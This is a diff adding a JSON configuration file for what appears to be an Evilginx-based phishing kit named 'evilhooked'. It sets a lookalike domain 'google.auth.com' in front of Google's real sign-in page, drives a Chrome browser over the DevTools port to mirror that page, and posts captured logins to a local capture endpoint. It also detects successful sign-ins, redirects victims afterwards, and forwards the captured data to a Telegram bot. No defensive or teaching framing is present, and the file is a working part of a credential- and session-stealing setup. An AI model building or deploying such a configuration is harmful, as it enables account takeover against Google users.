@@ -1,0 +1,31 @@
+{
+  "background": true,
+  "captureDir": "evilhooked/captures",
+  "cdpUrl": "http://127.0.0.1:9222",
+  "channel": "chrome",
+  "chromeProfileDir": "evilhooked/chrome-profile-cdp",
+  "evilginxCaptureUrl": "http://127.0.0.1:9092/puppet/capture",
+  "headless": false,
+  "host": "127.0.0.1",
+  "locale": "en-US",
+  "loginHost": "accounts.google.com",
+  "loginPath": "/v3/signin/identifier?flowName=GlifWebSignIn\u0026flowEntry=ServiceLogin\u0026hl=en",
+  "minimizeWindow": false,
+  "mode": "mirror",
+  "phishDomain": "google.auth.com",
+  "phishletName": "google",
+  "port": 1000,
+  "redirectAfterCapture": "https://www.google.auth.com/?hl=en",
+  "successUrlPattern": "myaccount\\.google\\.com|ManageAccount|CheckCookie|www\\.google\\.",
+  "telegram": {
+    "enabled": true,
+    "botToken": "",
+    "chatId": ""
+  },
+  "targetUrl": "https://accounts.google.com/v3/signin/identifier?flowName=GlifWebSignIn\u0026flowEntry=ServiceLogin\u0026hl=en\u0026continue=https%3A%2F%2Fwww.google.com%2F",
+  "timezoneId": "Europe/London",
+  "viewport": {
+    "height": 768,
+    "width": 1366
+  }
+}
